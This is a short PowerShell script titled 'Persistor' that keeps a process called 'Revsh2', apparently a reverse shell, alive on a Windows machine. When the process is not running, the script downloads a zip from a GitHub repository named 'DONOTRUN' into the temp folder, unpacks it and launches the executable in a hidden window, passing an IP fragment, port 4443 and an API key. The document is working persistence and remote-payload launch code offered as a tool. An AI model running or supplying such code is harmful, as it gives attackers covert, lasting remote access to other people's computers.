#Persistor

# --- Configuration ---
$processName = "Revsh2"                 # Name of the process (without .exe)
$remoteUrl   = "https://github.com/PowerfulHokko/DONOTRUN/raw/refs/heads/main/Revsh2.zip" # Your server URL
$localPath   = "$env:TEMP\Revsh2.zip"          # Where to save it locally
$apiUrl = "172."
$apiKey = "HL-12345-ABCDE-999"
$port = 4443

# Combine them into a single argument string
$args = "$apiUrl $port $apiKey"

# 1. Check if the process is already running
$isRunning = Get-Process -Name $processName -ErrorAction SilentlyContinue

if ($isRunning) {
    Write-Host "[✓] $processName is already running." -ForegroundColor Green
} else {
    Write-Host "[!] $processName not found. Checking local file..." -ForegroundColor Yellow

    # 2. Check if the file exists locally, if not, download it
    if (-not (Test-Path $localPath)) {
        Write-Host "[+] Downloading from $remoteUrl..." -ForegroundColor Cyan
        try {
            Invoke-WebRequest -Uri $remoteUrl -OutFile $localPath
            Write-Host "[✓] Download complete." -ForegroundColor Green
        } catch {
            Write-Error "Failed to download file: $_"
            exit
        }
    }

    # 3. Start the program
    Expand-Archive $localPath
    $exePath = "$env:TEMP\Revsh2\Revsh2.exe"
    Write-Host "[▶] Starting $processName with API configuration..." -ForegroundColor Magenta
    Start-Process -FilePath $exePath -ArgumentList $args -WindowStyle Hidden
}